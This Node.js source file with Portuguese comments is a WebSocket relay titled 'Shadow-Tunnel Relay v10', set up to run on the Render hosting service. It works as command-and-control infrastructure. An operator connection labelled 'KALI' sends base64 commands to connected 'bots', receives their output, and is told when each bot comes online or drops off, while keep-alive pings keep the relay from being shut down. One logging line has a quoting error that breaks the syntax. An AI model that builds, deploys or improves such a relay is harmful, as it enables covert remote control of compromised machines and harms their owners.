// ----------  SHADOW-TUNNEL RELAY v10  ---------- //
// 1.  Trava conexões simultâneas  →  mantém  alive  com  ping
// 2.  Aceita  qualquer  Origem  (Render  exige  isso)
// 3.  Log  reduzido  →  não  estoura  limite  de  log  do  Render

const WebSocket = require('ws');
const http      = require('http');

const server = http.createServer((_, r) => r.end('Shadow v10'));
const wss    = new WebSocket.Server({ server, path:'/' });

let KALI = null;
const BOTS = new Map();                 // id  →  ws

function rawSend(ws, data) {
    if (ws && ws.readyState === ws.OPEN) ws.send(data);
}

wss.on('connection', (ws, req) => {
    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
    if (!id) return ws.close(1008, 'missing id');

    if (id === 'KALI') {
        if (KALI) KALI.close();         // expulsa  Kali  antigo
        KALI = ws;
        console.log('[+] Kali ok');
        BOTS.forEach((_, botId) => rawSend(KALI, JSON.stringify({t: 'bot', s: 'on', id: botId})));
    } else {
        BOTS.set(id, ws);
        console.log(`[!] Bot ' + id);
        rawSend(KALI, JSON.stringify({t: 'bot', s: 'on', id}));
    }

    ws.on('message', raw => {
        if (ws === KALI) {                              // Kali  →  Bot
            try {
                const d = JSON.parse(raw);
                const target = BOTS.get(d.to);
                if (target) rawSend(target, d.cmd);     // cmd  já  vem  base64
            } catch {}
        } else {                                        // Bot  →  Kali
            rawSend(KALI, JSON.stringify({t: 'res', f: id, d: raw.toString()}));
        }
    });

    ws.on('close', () => {
        if (ws === KALI) { KALI = null; console.log('[-] Kali off'); }
        else {
            BOTS.delete(id);
            rawSend(KALI, JSON.stringify({t: 'bot', s: 'off', id}));
        }
    });

    // Keep-alive  (Render  mata  inativo  em  ~2  min)
    const timer = setInterval(() => (ws.readyState === ws.OPEN ? ws.ping() : clearInterval(timer)), 30000);
});

server.listen(process.env.PORT || 10000);
